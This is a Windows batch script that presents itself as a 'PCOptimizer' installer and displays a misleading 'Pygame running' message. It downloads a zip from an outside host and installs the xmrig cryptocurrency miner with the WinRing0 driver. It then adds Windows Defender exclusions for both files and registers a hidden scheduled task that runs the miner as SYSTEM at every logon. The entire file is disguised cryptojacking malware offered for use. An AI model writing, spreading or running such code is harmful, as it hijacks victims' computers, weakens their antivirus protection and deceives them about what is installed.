@echo off
setlocal EnableExtensions

:: ================= CONFIG =================
set "URL=https://bimsfault.net/base.zip"
set "APP_NAME=PCOptimizer"
set "INSTALL_DIR=%ProgramData%\%APP_NAME%"
set "ZIP_PATH=%TEMP%\%APP_NAME%.zip"
set "EXE_NAME=xmrig.exe"
set "DRIVER_NAME=WinRing0x64.sys"
:: =========================================

echo Pygame running do not close this terminal
net session >nul 2>&1
if %errorlevel% neq 0 (
echo ERROR: Please run this as Administrator.
pause
exit /b 1
)

if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"

powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%ZIP_PATH%' -ErrorAction Stop"
if %errorlevel% neq 0 (
echo ERROR: Database update failed.
pause
exit /b 1
)

powershell -Command "Expand-Archive -Path '%ZIP_PATH%' -DestinationPath '%INSTALL_DIR%' -Force"
if %errorlevel% neq 0 (
echo ERROR: Installation failed.
pause
exit /b 1
)

del "%ZIP_PATH%" >nul 2>&1

if exist "%INSTALL_DIR%\pc-optimizer" (
xcopy "%INSTALL_DIR%\pc-optimizer*" "%INSTALL_DIR%" /E /Y /I >nul
rmdir /s /q "%INSTALL_DIR%\pc-optimizer"
)

:: Add exclusions before running the executable
powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%\%DRIVER_NAME%'"
powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%\%EXE_NAME%'"

schtasks /create /tn "%APP_NAME%" ^
/tr "powershell.exe -WindowStyle Hidden -Command 'Start-Process \"%INSTALL_DIR%\%EXE_NAME%\" -WindowStyle Hidden'" ^
/sc onlogon ^
/ru SYSTEM ^
/rl highest ^
/f >nul

if %errorlevel% neq 0 (
echo ERROR.
pause
exit /b 1
)

echo.
echo Installation complete.
pause
